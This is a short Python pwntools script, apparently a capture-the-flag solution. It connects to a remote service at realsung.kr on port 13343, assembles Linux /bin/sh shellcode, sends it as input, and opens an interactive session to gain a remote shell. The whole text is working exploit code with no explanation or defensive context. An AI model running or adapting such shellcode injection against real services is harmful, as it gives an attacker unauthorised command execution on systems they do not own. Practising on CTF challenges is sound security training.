from pwn import *
context.clear(arch='amd64', os='linux')

p = remote("realsung.kr", 13343)

shellcode = shellcraft.linux.sh()
# print(shellcode)

p.sendline(asm(shellcode))

p.interactive()